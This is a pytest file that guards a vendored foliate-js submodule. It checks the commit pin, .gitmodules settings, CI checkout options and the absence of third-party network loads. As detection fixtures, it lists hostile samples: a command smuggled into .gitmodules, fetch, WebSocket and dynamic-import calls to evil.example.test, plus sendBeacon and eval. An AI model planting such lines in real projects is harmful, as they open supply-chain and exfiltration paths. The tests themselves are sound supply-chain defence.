"""EF-LEC-003 (préalable, M5 L11): foliate-js vendored as a submodule, pinned by commit.

Supply chain, not feature: the reader engine (L12) imports this code, so what the repository
tracks (one gitlink), what `docs/dependencies.md` documents (the same commit), what CI fetches and
what the reader loads at run time (nothing from a third-party origin) are tied together here.
"""

import re
import subprocess
from pathlib import Path

import pytest
import yaml

from tests.tools_loader import REPO, load_tool

pin = load_tool("check_submodule_pin")

SUBMODULE = "frontend/vendor/foliate-js"
OFFICIAL_URL = "https://github.com/johnfactotum/foliate-js.git"
SHA_A = "a" * 40
SHA_B = "b" * 40
WORKFLOWS = REPO / ".github" / "workflows"


def _git(root: Path, *args: str) -> None:
    subprocess.run(  # noqa: S603
        ["git", "-C", str(root), *args],  # noqa: S607
        check=True,
        capture_output=True,
    )


def _repo(
    tmp_path: Path,
    *,
    gitlink: str = SHA_A,
    documented: str = SHA_A,
    gitmodules: str | None = None,
) -> Path:
    """A throwaway repository with one gitlink, `.gitmodules` and a dependencies page."""
    tmp_path.mkdir(parents=True, exist_ok=True)
    _git(tmp_path, "init", "-q")
    _git(tmp_path, "update-index", "--add", "--cacheinfo", f"160000,{gitlink},{SUBMODULE}")
    (tmp_path / ".gitmodules").write_text(
        gitmodules
        if gitmodules is not None
        else f'[submodule "{SUBMODULE}"]\n\tpath = {SUBMODULE}\n\turl = {OFFICIAL_URL}\n',
        encoding="utf-8",
    )
    docs = tmp_path / "docs"
    docs.mkdir()
    (docs / "dependencies.md").write_text(
        f"## foliate-js (sous-module)\n\nCommit épinglé : `{documented}`\n", encoding="utf-8"
    )
    return tmp_path


# --- pinned to the documented commit -------------------------------------------------------------


@pytest.mark.req("EF-LEC-003")
def test_foliate_submodule_pinned_to_documented_commit() -> None:
    """The real repository: one gitlink, the commit written in `docs/dependencies.md`."""
    if pin.gitlink_commit(REPO) is None and not (REPO / ".git").exists():
        pytest.skip("not a Git work tree (remote copy): CI and `tools/check_submodule_pin.py pin`")
    assert pin.pin_problems(REPO) == []
    documented = pin.documented_commit(REPO)
    assert documented is not None
    assert re.fullmatch(r"[0-9a-f]{40}", documented), "a full 40-hex commit, never a short one"
    assert pin.gitlink_commit(REPO) == documented


@pytest.mark.req("EF-LEC-003")
def test_pin_check_accepts_a_matching_gitlink(tmp_path: Path) -> None:
    assert pin.pin_problems(_repo(tmp_path)) == []


@pytest.mark.req("EF-LEC-003")
def test_pin_check_refuses_a_gitlink_that_differs_from_the_documented_commit(
    tmp_path: Path,
) -> None:
    problems = pin.pin_problems(_repo(tmp_path, gitlink=SHA_B, documented=SHA_A))
    assert any("docs/dependencies.md" in p for p in problems), problems


@pytest.mark.req("EF-LEC-003")
def test_pin_check_refuses_a_short_or_missing_documented_commit(tmp_path: Path) -> None:
    short = pin.pin_problems(_repo(tmp_path / "short", documented=SHA_A[:7]))
    assert short, "a 7-hex commit is not a pin"
    root = _repo(tmp_path / "none")
    (root / "docs" / "dependencies.md").write_text("rien\n", encoding="utf-8")
    assert pin.pin_problems(root)


@pytest.mark.req("EF-LEC-003")
@pytest.mark.parametrize(
    "extra",
    [
        "\tbranch = main\n",  # a branch is a moving target
        "\tupdate = !sh -c 'npm run build'\n",  # a command run at update
        "\tshallow = true\n\tbranch = .\n",
    ],
)
def test_pin_check_refuses_a_branch_or_a_command_in_gitmodules(tmp_path: Path, extra: str) -> None:
    text = f'[submodule "{SUBMODULE}"]\n\tpath = {SUBMODULE}\n\turl = {OFFICIAL_URL}\n{extra}'
    assert pin.pin_problems(_repo(tmp_path, gitmodules=text))


@pytest.mark.req("EF-LEC-003")
@pytest.mark.parametrize(
    "url",
    [
        "http://github.com/johnfactotum/foliate-js.git",  # not TLS
        "https://github.com/someone-else/foliate-js.git",  # not the official repository
        "git@github.com:johnfactotum/foliate-js.git",
        "https://example.invalid/foliate-js.git",
    ],
)
def test_pin_check_refuses_an_url_other_than_the_official_https_one(
    tmp_path: Path, url: str
) -> None:
    text = f'[submodule "{SUBMODULE}"]\n\tpath = {SUBMODULE}\n\turl = {url}\n'
    assert pin.pin_problems(_repo(tmp_path, gitmodules=text))


@pytest.mark.req("EF-LEC-003")
def test_gitmodules_declares_only_the_foliate_submodule() -> None:
    text = (REPO / ".gitmodules").read_text(encoding="utf-8")
    assert re.findall(r'^\[submodule "([^"]+)"\]', text, re.M) == [SUBMODULE]


# --- licence, notices, update rule ---------------------------------------------------------------


@pytest.mark.req("EF-LEC-003")
def test_foliate_licence_is_mit_and_notices_name_the_vendored_code() -> None:
    notices = (REPO / "THIRD_PARTY_NOTICES").read_text(encoding="utf-8")
    for needle in (
        "foliate-js",
        "John Factotum",
        "MIT",
        "fflate",
        "zip.js",
        "BSD-3-Clause",
        "pdf.js",
        "Apache-2.0",
        pin.documented_commit(REPO) or "?",
    ):
        assert needle in notices, needle
    licence = REPO / SUBMODULE / "LICENSE"
    if licence.exists():  # the unit job does not fetch the submodule; the frontend job does
        head = licence.read_text(encoding="utf-8")[:200]
        assert head.startswith("MIT License")
        assert "John Factotum" in head


def _section(title: str) -> str:
    text = (REPO / "docs" / "dependencies.md").read_text(encoding="utf-8")
    match = re.search(rf"^## {re.escape(title)}\n(.*?)(?=^## |\Z)", text, re.M | re.S)
    assert match, f"section {title!r} missing from docs/dependencies.md"
    return match.group(1)


@pytest.mark.req("EF-LEC-003")
def test_dependencies_md_records_the_verified_pin_and_the_update_rule() -> None:
    body = _section("foliate-js (sous-module)")
    assert re.search(r"vérifié sur le dépôt officiel le 20\d\d-\d\d-\d\d", body)
    for needle in ("MIT", "johnfactotum/foliate-js", "dependabot", "cooldown", "audit"):
        assert needle.lower() in body.lower(), needle
    rule = body.split("Règle de mise à jour", 1)[1]
    for needle in ("Qui", "Comment", "Relecture"):
        assert needle in rule, needle


@pytest.mark.req("EF-LEC-003")
def test_audit_of_the_paths_that_move_nodes_is_recorded() -> None:
    """ADR-0055, condition of `'strict-dynamic'`: every node-moving path has a verdict."""
    body = _section("foliate-js : audit des chemins qui déplacent des nœuds")
    for path in ("footnotes.js", "overlayer.js", "search.js", "tts.js", "paginator.js"):
        row = next((line for line in body.splitlines() if line.startswith(f"| `{path}`")), None)
        assert row, f"{path}: no audit row"
        assert re.search(r"\b(écarté|inerte|sans déplacement)\b", row), f"{path}: no verdict"
    assert "extractContents" in body
    assert "cloneContents" in body


@pytest.mark.req("EF-LEC-003")
def test_dependabot_tracks_the_submodule_with_a_cooldown_and_no_auto_merge() -> None:
    config = yaml.safe_load((REPO / ".github" / "dependabot.yml").read_text(encoding="utf-8"))
    entry = next(u for u in config["updates"] if u["package-ecosystem"] == "gitsubmodule")
    assert entry["directory"] == "/"
    assert entry["cooldown"]["default-days"] >= 14
    assert entry["schedule"]["interval"] in {"monthly", "quarterly"}
    assert "auto" not in str(entry).lower()


@pytest.mark.req("EF-LEC-003")
def test_decision_record_gives_the_pin_and_its_verification_date() -> None:
    text = (REPO / "docs" / "decisions" / "M5.md").read_text(encoding="utf-8")
    body = text.split("## L11", 1)[1]
    assert pin.documented_commit(REPO) in body
    assert re.search(r"vérifié .*20\d\d-\d\d-\d\d", body, re.I)


# --- CI: checkout, no build script ---------------------------------------------------------------


def _jobs(name: str) -> dict[str, dict[str, object]]:
    loaded = yaml.safe_load((WORKFLOWS / name).read_text(encoding="utf-8"))
    jobs: dict[str, dict[str, object]] = loaded["jobs"]
    return jobs


def _steps(job: dict[str, object]) -> list[dict[str, object]]:
    steps = job.get("steps", [])
    assert isinstance(steps, list)
    return steps


def _needs_frontend_sources(job: dict[str, object]) -> bool:
    for step in _steps(job):
        run = str(step.get("run", ""))
        # lint, type-check, test or build of the frontend, or an image whose context holds it
        if re.search(r"\bnpm (run|test)\b", run) or "build-push-action" in str(
            step.get("uses", "")
        ):
            return True
    return False


@pytest.mark.req("EF-LEC-003")
@pytest.mark.parametrize("workflow", ["ci.yml", "image.yml"])
def test_ci_checkout_fetches_the_submodule_where_the_frontend_is_built(workflow: str) -> None:
    checked = 0
    for name, job in _jobs(workflow).items():
        if not _needs_frontend_sources(job):
            continue
        checkouts = [s for s in _steps(job) if "actions/checkout@" in str(s.get("uses", ""))]
        assert checkouts, f"{workflow}:{name} builds the frontend without a checkout"
        for step in checkouts:
            with_ = step.get("with") or {}
            assert isinstance(with_, dict)
            # `true`, never `recursive`: the gitlink fixes the commit, nothing nested is fetched.
            assert with_.get("submodules") is True, f"{workflow}:{name}: submodules: true missing"
            assert with_.get("persist-credentials") is False
            checked += 1
    assert checked, f"{workflow}: no job found that needs the frontend sources"


@pytest.mark.req("EF-LEC-003")
def test_ci_never_fetches_submodules_recursively_or_without_need() -> None:
    for path in sorted(WORKFLOWS.glob("*.yml")):
        text = path.read_text(encoding="utf-8")
        assert "recursive" not in re.findall(r"submodules:\s*(\S+)", text), path.name


@pytest.mark.req("EF-LEC-003")
def test_ci_runs_the_pin_check_without_depending_on_the_scope_filter() -> None:
    lint = _jobs("ci.yml")["lint"]
    runs = " ".join(str(s.get("run", "")) for s in _steps(lint))
    assert "check_submodule_pin.py pin" in runs
    frontend = " ".join(str(s.get("run", "")) for s in _steps(_jobs("ci.yml")["frontend"]))
    assert "check_submodule_pin.py assets --require-checkout" in frontend


@pytest.mark.req("EF-LEC-003")
def test_no_build_script_runs_from_the_submodule() -> None:
    """foliate-js ships a rollup config and npm scripts: none is ever run, none is trusted."""
    package = (REPO / "frontend" / "package.json").read_text(encoding="utf-8")
    assert "vendor/foliate-js" not in package, "no dependency, script or workspace points into it"
    assert '"workspaces"' not in package
    for path in [*WORKFLOWS.glob("*.yml"), REPO / "docker" / "Dockerfile"]:
        for line in path.read_text(encoding="utf-8").splitlines():
            if "vendor/foliate-js" in line:
                assert not re.search(r"\b(npm|npx|node|rollup|yarn|pnpm|make|sh|bash)\b", line), (
                    f"{path.name}: {line.strip()}"
                )
    ignore = (REPO / "frontend" / "eslint.config.js").read_text(encoding="utf-8")
    assert "vendor/" in ignore, "the linter never walks the vendored code"
    assert "frontend/vendor/" in (REPO / "typos.toml").read_text(encoding="utf-8")


# --- no reader asset from a third-party origin ---------------------------------------------------


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
def test_no_reader_asset_from_third_party_origin() -> None:
    """The reader loads nothing from a CDN: the application sources, then the vendored code."""
    assert pin.asset_problems(REPO) == []


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
@pytest.mark.parametrize(
    "line",
    [
        '<script src="https://cdn.example.test/lib.js"></script>',
        '<link rel="stylesheet" href="//fonts.example.test/x.css">',
        "@import url('https://fonts.example.test/x.css');",
        "import x from 'https://esm.example.test/x.js'",
        "const m = await import(`https://esm.example.test/x.js`)",
        "fetch('https://api.example.test/book')",
        "new Worker('https://cdn.example.test/w.js')",
        "importScripts('https://cdn.example.test/w.js')",
        "src: url(https://fonts.example.test/f.woff2)",
    ],
)
def test_asset_scan_flags_every_way_to_load_from_a_third_party_origin(
    tmp_path: Path, line: str
) -> None:
    (tmp_path / "frontend" / "src").mkdir(parents=True)
    (tmp_path / "frontend" / "src" / "reader.ts").write_text(line + "\n", encoding="utf-8")
    assert pin.asset_problems(tmp_path)


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
def test_asset_scan_accepts_xml_namespaces_and_comments_in_the_vendored_code(
    tmp_path: Path,
) -> None:
    vendored = tmp_path / SUBMODULE
    vendored.mkdir(parents=True)
    (vendored / "epub.js").write_text(
        "const NS = { XHTML: 'http://www.w3.org/1999/xhtml' }\n"
        "// see https://stackoverflow.com/a/1\n"
        "/* https://github.com/x/y */\n",
        encoding="utf-8",
    )
    assert pin.asset_problems(tmp_path) == []


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
def test_asset_scan_flags_a_new_host_and_a_new_loader_in_the_vendored_code(
    tmp_path: Path,
) -> None:
    """An update that adds a network path is stopped here and goes to the manual review."""
    vendored = tmp_path / SUBMODULE
    vendored.mkdir(parents=True)
    (vendored / "view.js").write_text(
        "configure({ useWebWorkers: false })\nconst u = 'https://tracker.example.test/x'\n"
    )
    (vendored / "paginator.js").write_text("const w = new WebSocket(url)\n")
    (vendored / "epub.js").write_text("navigator.sendBeacon(url)\n")
    problems = pin.asset_problems(tmp_path)
    assert len(problems) >= 3, problems
    assert any("tracker.example.test" in p for p in problems)


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
def test_csp_and_headers_of_the_application_name_no_third_party_host() -> None:
    for path in (
        REPO / "frontend" / "scripts" / "csp.ts",
        REPO / "backend" / "src" / "shelfhold" / "infrastructure" / "http_headers.py",
    ):
        hosts = re.findall(r"(?<![\w-])https?://[\w.-]+", path.read_text(encoding="utf-8"))
        assert not hosts, f"{path.name}: {hosts}"


# --- review of the contradictor: bypasses of the guards -----------------------------------------


_HEAD = f'[submodule "{SUBMODULE}"]\n'
_PATH = f"\tpath = {SUBMODULE}\n"
_URL = f"\turl = {OFFICIAL_URL}\n"


@pytest.mark.req("EF-LEC-003")
@pytest.mark.parametrize(
    "text",
    [
        # a more indented line continues the previous value for configparser, but is a key of
        # its own for Git
        _HEAD + _PATH + "\t\tbranch = main\n" + _URL,
        _HEAD + _PATH + _URL + "\t\tupdate = !true\n",
        _HEAD + "\tpath = frontend/vendor/other\n" + _URL,
        _HEAD + _PATH + _URL + _URL,
        _HEAD + _PATH,
        _HEAD + _PATH + _URL + '[submodule "x"]\n\tpath = x\n' + _URL,
    ],
)
def test_pin_check_reads_gitmodules_like_git_does(tmp_path: Path, text: str) -> None:
    assert pin.pin_problems(_repo(tmp_path, gitmodules=text))


@pytest.mark.req("EF-LEC-003")
def test_pin_check_refuses_a_second_gitlink(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    _git(root, "update-index", "--add", "--cacheinfo", f"160000,{SHA_A},frontend/vendor/evil")
    assert any("only gitlink" in p for p in pin.pin_problems(root))


@pytest.mark.req("EF-LEC-003")
def test_pin_check_refuses_another_commit_in_the_audit_or_the_notices(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    doc = root / "docs" / "dependencies.md"
    doc.write_text(
        doc.read_text(encoding="utf-8") + f"\n## foliate-js : audit\nAudit du commit `{SHA_B}`\n",
        encoding="utf-8",
    )
    assert any("mentions commit" in p for p in pin.pin_problems(root))
    doc.write_text(f"## foliate-js (sous-module)\n\nCommit épinglé : `{SHA_A}`\n", encoding="utf-8")
    (root / "THIRD_PARTY_NOTICES").write_text(f"Commit: {SHA_B}\n", encoding="utf-8")
    assert pin.pin_problems(root)


def _vendored(tmp_path: Path, **files: str) -> Path:
    base = tmp_path / SUBMODULE
    base.mkdir(parents=True)
    for name, text in files.items():
        (base / name).write_text(text, encoding="utf-8")
    return base


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
@pytest.mark.parametrize(
    "code",
    [
        'const a = "/*"; fetch("https://evil.example.test/x"); const b = "*/"',  # in strings
        "fetch('https:'+'//evil.example.test/x')",
        "fetch(`https://${host}/x`)",
        "const s = new WebSocket('wss://evil.example.test')",
        "await import('//evil.example.test/x.js')",
        "globalThis.open(url)",
        "frame.src = url",
        "const w = globalThis['Wor' + 'ker']\nnew Worker(u)",
        "navigator.sendBeacon(u)",
        "node.cloneNode(true)",
        "document.write(x)",
        "eval(x)",
    ],
)
def test_asset_scan_flags_each_primitive_beyond_the_audited_inventory(
    tmp_path: Path, code: str
) -> None:
    _vendored(tmp_path, **{"newfile.js": code + "\n"})
    assert pin.asset_problems(tmp_path), code


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
def test_asset_scan_pins_the_vendored_bundles(tmp_path: Path) -> None:
    base = _vendored(tmp_path, **{"view.js": "configure({ useWebWorkers: false })\n"})
    (base / "vendor").mkdir()
    (base / "vendor" / "zip.js").write_text("changed", encoding="utf-8")
    (base / "vendor" / "new.js").write_text("fetch(u)", encoding="utf-8")
    problems = pin.asset_problems(tmp_path)
    assert any("zip.js" in p for p in problems), problems
    assert any("new.js" in p for p in problems), problems


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
def test_asset_scan_requires_zip_workers_to_stay_off_in_code_not_in_a_comment(
    tmp_path: Path,
) -> None:
    _vendored(tmp_path, **{"view.js": "// configure({ useWebWorkers: false })\n"})
    assert any("useWebWorkers" in p for p in pin.asset_problems(tmp_path))


@pytest.mark.req("EF-LEC-003")
def test_audit_has_a_row_for_every_script_of_the_library() -> None:
    """Contradictor M2: the audit names every root and ui/ script, imported or not."""
    base = REPO / SUBMODULE
    if not (base / "view.js").exists():
        pytest.skip("submodule not checked out in this job")
    body = _section("foliate-js : audit des chemins qui déplacent des nœuds")
    scripts = {p.name for p in base.glob("*.js")} | {
        f"ui/{p.name}" for p in (base / "ui").glob("*.js")
    }
    scripts -= {"eslint.config.js", "rollup.config.js"}  # build files, never run
    for name in sorted(scripts):
        assert f"`{name}`" in body, f"audit has no row for {name}"
